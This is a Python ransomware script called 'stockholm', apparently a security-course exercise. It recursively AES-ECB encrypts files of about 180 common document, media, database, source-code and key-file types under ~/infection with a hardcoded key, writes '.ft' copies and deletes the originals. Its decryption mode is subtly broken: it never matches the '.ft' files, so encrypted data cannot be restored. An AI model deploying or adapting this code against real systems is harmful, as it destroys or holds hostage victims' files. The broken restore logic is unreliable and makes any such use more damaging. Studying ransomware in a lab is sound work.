import argparse
import os
import glob
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

KEY = 'ThisIsASecretKey'  # This should be input by the user or generated

def encrypt_file(filename, key, silent):
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    with open(filename, 'rb') as f:
        plaintext = f.read()
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    with open(filename+'.ft', 'wb') as f:
        f.write(ciphertext)
    if not silent:
        print(f'Encrypted {filename}')
    os.remove(filename)

def decrypt_file(filename, key, silent):
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    with open(filename, 'rb') as f:
        ciphertext = f.read()
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    with open(filename[:-3], 'wb') as f:  # remove '.ft' extension
        f.write(plaintext)
    if not silent:
        print(f'Decrypted {filename}')
    os.remove(filename)

def main():
    parser = argparse.ArgumentParser(description="stockholm")
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
    parser.add_argument('-r', '--reverse', type=str, help='reverse the infection')
    parser.add_argument('-s', '--silent', action='store_true', help='no output')
    args = parser.parse_args()

    directory = os.path.join(os.path.expanduser('~'), 'infection')
    if not os.path.exists(directory):
        print(f'{directory} does not exist')
        return

    file_types = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']

    for file_type in file_types:
        for filename in glob.glob(f'{directory}/**/*{file_type}', recursive=True):
            if args.reverse:
                if filename.endswith('.ft'):
                    decrypt_file(filename, args.reverse, args.silent)
            else:
                encrypt_file(filename, KEY, args.silent)

if __name__ == "__main__":
    main()
